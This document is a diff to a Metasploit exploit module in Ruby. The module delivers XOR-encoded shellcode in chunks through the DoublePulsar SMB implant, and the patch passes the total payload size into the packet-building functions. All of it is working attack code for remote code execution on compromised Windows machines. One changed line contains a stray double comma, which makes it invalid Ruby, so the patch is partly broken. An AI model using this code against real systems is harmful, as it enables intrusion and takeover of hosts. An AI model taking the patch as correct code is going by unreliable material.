@@ -211,7 +211,7 @@ class MetasploitModule < Msf::Exploit::Remote
 	until times == iterations do
 		#break if times == iterations
 		copied_bytes = xor_shellcode[offset, 4096]
-      		code, _signature1, _signature2 = do_exec_doublepulsar_pkt(OPCODES[:exec], copied_bytes, 4096, offset)
+      		code, _signature1, _signature2 = do_exec_doublepulsar_pkt(OPCODES[:exec], copied_bytes, , total_size, 4096, offset)
 		offset += 4096
 		bytes_left -= 4096
 		times += 1
@@ -220,7 +220,7 @@ class MetasploitModule < Msf::Exploit::Remote
 	if remainder > 0
 		#last packet here
 		copied_bytes = xor_shellcode[offset, bytes_left]
-		code, _signature1, _signature2 = do_exec_doublepulsar_pkt(OPCODES[:exec], copied_bytes, bytes_left, offset)
+		code, _signature1, _signature2 = do_exec_doublepulsar_pkt(OPCODES[:exec], copied_bytes, total_size, bytes_left, offset)
 	else
 		print_status("DONE!")
     	end
@@ -335,9 +335,9 @@ class MetasploitModule < Msf::Exploit::Remote
     sc
   end
 
-  def do_exec_doublepulsar_pkt(opcode, body, chunk, offset)
+  def do_exec_doublepulsar_pkt(opcode, body, total_payload_size, chunk, offset)
     # make doublepulsar knock
-    pkt = make_exec_trans2_doublepulsar(opcode, body, chunk, offset)
+    pkt = make_exec_trans2_doublepulsar(opcode, body, total_payload_size, chunk, offset)
 
     sock.put(pkt)
     bytes = sock.get_once
@@ -351,11 +351,11 @@ class MetasploitModule < Msf::Exploit::Remote
     return pkt['SMB'].v['MultiplexID'], pkt['SMB'].v['Signature1'], pkt['SMB'].v['Signature2']
   end
 
-  def make_exec_trans2_doublepulsar(opcode, body, chunk_size, offsetCounter)
+  def make_exec_trans2_doublepulsar(opcode, body, total_payload_size, chunk_size, offsetCounter)
     setup_count = 1
     setup_data = [0x000e].pack('v')
 
-    param = generate_exec_doublepulsar_param(opcode, body, chunk_size, offsetCounter)
+    param = generate_exec_doublepulsar_param(opcode, total_payload_size, chunk_size, offsetCounter)
     data = param + body.to_s
 
     pkt = Rex::Proto::SMB::Constants::SMB_TRANS2_PKT.make_struct
@@ -391,12 +391,12 @@ class MetasploitModule < Msf::Exploit::Remote
     pkt.to_s
   end
 
-  def generate_exec_doublepulsar_param(op, body, chunk, payload_offset)
+  def generate_exec_doublepulsar_param(op, total_payload_size, chunk, payload_offset)
     case OPCODES.key(op)
     when :ping, :kill
       "\x00" * 12
     when :exec
-      Rex::Text.xor([@xor_key].pack('V'), [body.length, chunk, payload_offset].pack('V*'))
+      Rex::Text.xor([@xor_key].pack('V'), [total_payload_size, chunk, payload_offset].pack('V*'))
     end
   end
 
